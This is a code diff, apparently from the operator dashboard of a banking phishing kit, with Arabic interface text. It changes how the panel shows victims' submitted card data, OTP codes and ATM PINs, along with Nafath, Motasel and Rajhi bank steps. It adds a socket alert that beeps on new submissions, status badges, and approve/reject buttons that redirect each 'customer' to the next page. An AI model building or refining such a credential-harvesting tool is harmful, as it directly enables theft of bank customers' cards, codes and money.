@@ -595,27 +595,22 @@
       if (d.success) {
         const actionLabel = action === 'pass' ? '✅ قبول' : '❌ رفض';
         toast(`${actionLabel} - الخطوة ${d.currentStep}: تم توجيه العميل إلى ${d.targetPage}`, action==='pass'?'ok':'err');
-        // تحديث معلومات الخطوة في النافذة
-        const stepInfo = document.getElementById(`step-info-${ref}`);
-        if (stepInfo) {
-          const nextStep = action === 'pass' ? Math.min((d.currentStep||1)+1, 3) : d.currentStep;
-          const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
-          stepInfo.textContent = `الخطوة الحالية: ${stepNames[nextStep]||'مكتملة'} | آخر إجراء: ${actionLabel} → ${d.targetPage}`;
-        }
         loadAll();
         // إعادة تحميل التفاصيل تلقائياً لتحديث الأزرار بدون إغلاق النافذة
         if (currentOpenRef && currentOpenRef === ref) {
-          setTimeout(() => openDetail(ref), 600);
+          setTimeout(() => openDetail(ref), 400);
+        } else {
+          // إعادة تفعيل الأزرار مباشرة إذا لم تُعد النافذة
+          if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
+          if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
         }
       } else {
         toast('فشل الإجراء: ' + (d.error||''), 'err');
-        // إعادة تفعيل الأزرار عند الفشل
         if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
         if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
       }
     } catch(e) {
       toast('خطأ في الاتصال', 'err');
-      // إعادة تفعيل الأزرار عند الخطأ
       if (passBtn) { passBtn.disabled = false; passBtn.innerHTML = '<i class="bi bi-check-circle-fill"></i> قبول'; }
       if (denyBtn) { denyBtn.disabled = false; denyBtn.innerHTML = '<i class="bi bi-x-circle-fill"></i> رفض'; }
     }
@@ -808,9 +803,37 @@
     sock.on("newPayment", (d) => {
       const stepNames = { 1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري ATM' };
       const stepLabel = d.step ? ` (${stepNames[d.step]||'خطوة '+d.step})` : '';
-      beep(); toast(`بيانات دفع جديدة: ${d.reference}${stepLabel}`,"inf");
+      beep(); toast(`بيانات جديدة: ${d.reference}${stepLabel}`,"inf");
+      // تحديث الشارة في الجدول فوراً
+      const statusMap = {
+        payment: 'pending_payment',
+        otp: 'pending_otp',
+        code: 'pending_atm',
+        nafath: 'pending_nafath',
+        phone: 'pending_motasel',
+        phoneCode: 'pending_motasel',
+        motasel: 'pending_motasel',
+        motaselCode: 'pending_motasel',
+        rajhi: 'pending_payment',
+        rajhiCode: 'pending_atm',
+      };
+      const newStatus = statusMap[d.type];
+      if (newStatus && d.reference) {
+        const allRows = document.querySelectorAll('#tBody tr');
+        allRows.forEach(row => {
+          if (row.innerHTML.includes(d.reference)) {
+            const badgeEl = row.querySelector('.badge');
+            if (badgeEl) {
+              const s = STATUS[newStatus] || { lbl: newStatus, cls:'b-new' };
+              badgeEl.className = `badge ${s.cls}`;
+              badgeEl.textContent = s.lbl;
+            }
+          }
+        });
+        const rowIdx = rows.findIndex(r => r.referenceId === d.reference);
+        if (rowIdx !== -1) rows[rowIdx].status = newStatus;
+      }
       loadAll();
-      // إذا كانت نافذة التفاصيل مفتوحة لنفس الـ reference، أعد تحميلها تلقائياً
       if (currentOpenRef && currentOpenRef === d.reference) {
         setTimeout(() => openDetail(d.reference), 500);
       }
